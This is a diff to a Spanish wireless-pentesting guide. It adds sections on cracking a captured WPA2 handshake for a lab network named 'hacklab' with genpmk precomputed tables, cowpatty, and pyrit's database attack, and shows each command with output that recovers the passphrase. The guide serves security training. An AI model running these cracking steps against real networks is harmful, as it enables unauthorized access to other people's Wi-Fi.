@@ -38,9 +38,9 @@
             * [Cracking con Cowpatty](#cracking-con-cowpatty)
             * [Cracking con Airolib](#cracking-con-airolib)
             * [Rainbow Table con GenPMK](#rainbow-table-con-genpmk)
-            * [Cracking con Pyrit frente a Rainbow Table](#cracking-con-pyrit-frente-a-rainbow-table)
             * [Cracking con Cowpatty frente a Rainbow Table](#cracking-con-cowpatty-frente-a-rainbow-table)
-            * [Cracking con Pyrit a través de ataque por base de-datos](#cracking-con-pyrit-a-través-de-ataque-por-base-de-datos)
+            * [Cracking con Pyrit frente a Rainbow Table](#cracking-con-pyrit-frente-a-rainbow-table)
+            * [Cracking con Pyrit a través de ataque por base de datos](#cracking-con-pyrit-a-través-de-ataque-por-base-de-datos)
         * [Técnicas de espionaje](#técnicas-de-espionaje)
             * [Uso de Airdecap para el desencriptado de paquetes](#uso-de-airdecap-para-el-desencriptado-de-paquetes)
             * [Análisis del desencriptado con Tshark y Wireshark](#análisis-del-desencriptado-con-tshark-y-wireshark)
@@ -2556,8 +2556,166 @@ que sea interpretado por estas fantásticas herramientas.
 La sintaxis es la siguiente:
 
 ```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #genpmk -f diccionario -d dic.genpmk -s hacklab
+genpmk 1.3 - WPA-PSK precomputation attack. <jwright@hasborg.com>
+File dic.genpmk does not exist, creating.
+key no. 1000: skittles1
+key no. 2000: princess15
+key no. 3000: unfaithful
+key no. 4000: andresteamo
+key no. 5000: hennessy
+key no. 6000: amigasporsiempre
+key no. 7000: 0123654789
+key no. 8000: trinitron
+key no. 9000: flower22
+key no. 10000: vincenzo
+key no. 11000: pensacola
+key no. 12000: boyracer
+key no. 13000: grandmom
+key no. 14000: battlefield
+key no. 15000: badangel
+key no. 16000: liferocks
+key no. 17000: forever15
+key no. 18000: gabriell
+key no. 19000: mexico18
+key no. 20000: 13031991
+key no. 21000: kitty1234
+key no. 22000: casper22
+key no. 23000: 12021989
+key no. 24000: tigers15
 
+24078 passphrases tested in 39.35 seconds:  611.90 passphrases/second
 ```
+
+Esto lo que ha hecho ha sido generarnos un nuevo diccionario **dic.genpmk** de claves precomputadas. Llegados
+a este punto, podemos hacer lo que se describe en los siguientes puntos.
+
+### Cracking con Cowpatty frente a Rainbow Table
+
+Aprovechando el diccionario **dic.genpmk** generado con **genpmk**, hacemos lo siguiente:
+
+```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #cowpatty -d dic.genpmk -r Captura-01.cap -s hacklab
+cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>
+
+Collected all necessary data to mount crack against WPA2/PSK passphrase.
+Starting dictionary attack.  Please be patient.
+key no. 10000: vincenzo
+
+The PSK is "hottie4u".
+
+15242 passphrases tested in 0.04 seconds:  361013.75 passphrases/second
+```
+
+Puntos clave:
+
+* 361.013 contraseñas por segundo
+* 0.04 segundos en dar la contraseña
+
+¿Intentamos ir algo más rápido?
+
+### Cracking con Pyrit frente a Rainbow Table
+
+Aprovechando una vez más el mismo diccionario **dic.genpmk** generado con **genpmk**, hacemos lo siguiente:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #pyrit -i dic.genpmk -e hacklab -r Captura-01.cap attack_cowpatty
+Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
+https://github.com/JPaulMora/Pyrit
+This code is distributed under the GNU General Public License v3+
+
+Parsing file 'Captura-01.cap' (1/1)...
+Parsed 43 packets (43 802.11-packets), got 1 AP(s)
+
+Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
+Tried 24078 PMKs so far; 1992708 PMKs per second.
+
+The password is 'hottie4u'.
+```
+
+Puntos clave:
+
+* 1.992.708 contraseñas por segundo
+
+Ya en este punto se podría decir que trabajando a unas casi 2 millones de contraseñas por segundo, estaríamos
+más que contentos, ¿verdad?, pero es que se puede ir aún más rápido todavía.
+
+### Cracking con Pyrit a través de ataque por Base de Datos
+
+Este es ya el considerado como el método más potente. Comenzamos importando todas las contraseñas de nuestro
+diccionario desde **Pyrit**:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #pyrit -i diccionario import_passwords
+Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
+https://github.com/JPaulMora/Pyrit
+This code is distributed under the GNU General Public License v3+
+
+Connecting to storage at 'file://'...  connected.
+70000 lines read. Flushing buffers.... 
+All done.
+```
+
+Una vez hecho, especificamos el **ESSID** con el que vamos a trabajar:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #pyrit -e hacklab create_essid
+Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
+https://github.com/JPaulMora/Pyrit
+This code is distributed under the GNU General Public License v3+
+
+Connecting to storage at 'file://'...  connected.
+ESSID already created
+```
+
+Por último, generamos las claves precomputadas:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #pyrit batch
+Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
+https://github.com/JPaulMora/Pyrit
+This code is distributed under the GNU General Public License v3+
+
+Connecting to storage at 'file://'...  connected.
+Batchprocessing done.
+```
+
+Iniciamos el ataque en modo ataque de base de datos con **Pyrit**:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #pyrit -r Captura-01.cap attack_db
+Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
+https://github.com/JPaulMora/Pyrit
+This code is distributed under the GNU General Public License v3+
+
+Connecting to storage at 'file://'...  connected.
+Parsing file 'Captura-01.cap' (1/1)...
+Parsed 43 packets (43 802.11-packets), got 1 AP(s)
+
+Picked AccessPoint 20:34:fb:b1:c5:53 ('hacklab') automatically.
+Attacking handshake with Station 34:41:5d:46:d1:38...
+Tried 37326 PMKs so far (100.0%); 18289321 PMKs per second.
+
+The password is 'hottie4u'.
+```
+
+Y fijaros que velocidad más vertiginosa:
+
+* **18.289.321 contraseñas por segundo**
+
+#### Técnicas de Espionaje
+
+
+
+
+
 
 
 
